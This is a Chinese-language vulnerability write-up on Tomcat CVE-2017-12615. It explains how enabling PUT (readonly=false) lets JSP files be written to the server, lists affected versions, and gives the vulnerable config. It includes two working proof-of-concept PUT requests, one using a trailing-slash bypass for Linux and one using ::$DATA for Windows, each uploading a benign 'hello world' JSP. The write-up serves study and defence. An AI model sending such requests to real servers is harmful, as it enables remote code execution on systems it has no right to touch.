---
author: YOUZAI
title: Tomcat 任意文件写入漏洞（CVE-2017-12615）
date: 2023/06/20
categories:
 - 漏洞文库
tags:
 - Tomcat
---

## 漏洞简介

当 Tomcat 启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。

::: info 影响版本

- [x] Apache Tomcat 7.0.0 ~ 7.0.79（7.0.81 修复不完全）

:::

## 漏洞复现

使用 docker 搭建环境：

![](/images/微信图片_20220905173358.png)

使用 PUT 方法将 JSP 文件写入服务器：

![](/images/微信图片_20220905173714.png)

访问写入的文件：

![](/images/微信图片_20220905173806.png)

POC：

* Linux

```http
PUT /test.jsp/ HTTP/1.1
Host: 192.168.43.127:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 54

<%
	String str = "hello world";
	out.print(str);
%>
```

* Windows

```http
PUT /test.jsp::$DATA HTTP/1.1
Host: 192.168.43.127:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 54

<%
	String str = "hello world";
	out.print(str);
%>
```

## 漏洞原理

漏洞本质是 Tomcat 配置了可写（readonly=false），导致我们可以往服务器写文件：

```ini
<servlet>
    <servlet-name>default</servlet-name>
    <servlet-class>org.apache.catalina.servlets.DefaultServlet</servlet-class>
    <init-param>
        <param-name>debug</param-name>
        <param-value>0</param-value>
    </init-param>
    <init-param>
        <param-name>listings</param-name>
        <param-value>false</param-value>
    </init-param>
    <init-param>
        <param-name>readonly</param-name>
        <param-value>false</param-value>
    </init-param>
    <load-on-startup>1</load-on-startup>
</servlet>
```